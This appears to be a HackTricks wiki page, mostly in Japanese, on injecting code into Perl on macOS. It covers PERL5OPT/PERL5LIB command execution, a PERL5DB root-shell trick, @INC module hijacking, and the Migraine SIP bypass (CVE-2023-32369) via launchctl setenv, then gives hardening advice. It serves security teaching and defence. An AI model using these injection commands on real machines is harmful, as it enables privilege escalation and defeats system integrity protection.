# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `PERL5OPT` と `PERL5LIB` env variable 経由

env variable **`PERL5OPT`** を使用すると、interpreter の起動時に **Perl** に任意のコマンドを実行させることが可能です（対象スクリプトの最初の行が解析される**前**であっても実行されます）。
例えば、次のスクリプトを作成します：
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
ここで **env 変数を export** し、**perl** スクリプトを実行します:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
別の選択肢として、Perl module（例: `/tmp/pmod.pm`）を作成します。
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
そして、env variablesを使用して、moduleが自動的に見つけられ、ロードされるようにします。
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### その他の興味深い environment variables

* **`PERL5DB`** – interpreter が **`-d`**（debugger）flag 付きで起動された場合、`PERL5DB` の内容が debugger context *inside* で Perl code として実行されます。
privileged Perl process の environment **および** command-line flags の両方に影響を与えられる場合、次のようなことが可能です。

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # will drop a shell before executing the script
```

* **`PERL5SHELL`** – Windows では、この variable により、Perl が shell を spawn する必要があるときに使用する shell executable が制御されます。ここでは completeness のために記載していますが、macOS には関係ありません。

`PERL5DB` には **`-d`** switch が必要ですが、verbose troubleshooting のためにこの flag を有効にして *root* として実行される maintenance または installer scripts はよく存在します。そのため、この variable は有効な escalation vector になります。

## dependencies 経由（@INC abuse）

Perl が検索する include path（**`@INC`**）は、次を実行することで一覧表示できます。
```bash
perl -e 'print join("\n", @INC)'
```
macOS 13/14 での典型的な出力は次のようになります：
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
返されるフォルダの一部は実際には存在しません。しかし **`/Library/Perl/5.30`** は存在し、SIP によって保護されておらず、SIP によって保護されたフォルダよりも前にあります。そのため、*root* として書き込み可能であれば、悪意のあるモジュール（例: `File/Basename.pm`）を配置し、そのモジュールを import する特権スクリプトによって *優先的に* 読み込ませることができます。

> [!WARNING]
> **`/Library/Perl`** 内に書き込むには、引き続き **root** が必要です。また macOS は書き込み操作を実行するプロセスに対して、*Full Disk Access* を求める **TCC** プロンプトを表示します。

例えば、スクリプトが **`use File::Basename;`** を import している場合、攻撃者が制御するコードを含む `/Library/Perl/5.30/File/Basename.pm` を作成できます。

## Migration Assistant経由のSIP bypass（CVE-2023-32369「Migraine」）

2023年5月、Microsoft は **CVE-2023-32369**（通称 **Migraine**）を公開しました。これは、*root* attacker が **System Integrity Protection（SIP）を完全に bypass** できる post-exploitation technique です。  
脆弱なコンポーネントは **`systemmigrationd`** です。この daemon には **`com.apple.rootless.install.heritable`** entitlement が付与されています。この daemon によって spawn された child process は entitlement を継承するため、SIP の制限の**外部**で実行されます。<sup>[[1]](#references)</sup>

研究者が特定した child の中には、Apple-signed interpreter も含まれています。<sup>[[1]](#references)</sup>
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Perlは`PERL5OPT`を（Bashは`BASH_ENV`を）尊重するため、SIPが無効なコンテキストでは、daemonの*environment*をpoisoningするだけで任意の実行を取得できます：<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
`migrateLocalKDC`が実行されると、`/usr/bin/perl`は悪意のある`PERL5OPT`を使って起動し、*SIPが再有効化される前に* `/private/tmp/migraine.sh`を実行します。このスクリプトから、例えばペイロードを**`/System/Library/LaunchDaemons`**内にコピーしたり、`com.apple.rootless`拡張属性を設定してファイルを**削除不能**にしたりできます。

AppleはmacOS **Ventura 13.4**、**Monterey 12.6.6**、**Big Sur 11.7.7**でこの問題を修正しましたが、古いシステムやパッチが適用されていないシステムは引き続きexploit可能です。<sup>[[1]](#references)</sup>

## Hardeningの推奨事項

1. **危険な変数をクリアする** – privileged launchdaemonやcron jobは、クリーンな環境で起動する必要があります（`launchctl unsetenv PERL5OPT`、`env -i`など）。
2. **rootとしてinterpreterを実行しない** – 厳密に必要な場合を除き、compiled binaryを使用するか、早い段階でprivilegeを削除します。
3. **`-T`（taint mode）を付けてvendor scriptを実行する** – taint checkingが有効な場合、Perlは`PERL5OPT`やその他の安全でないswitchを無視します。
4. **macOSを最新の状態に保つ** – 「Migraine」は現在のreleaseで完全にpatch済みです。

## References

- [1] [Microsoft Security Blog – New macOS vulnerability, Migraine, could bypass System Integrity Protection (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [Hackyboiz – macOS: Part1 - SIP Bypass](https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/)

{{#include ../../../banners/hacktricks-training.md}}
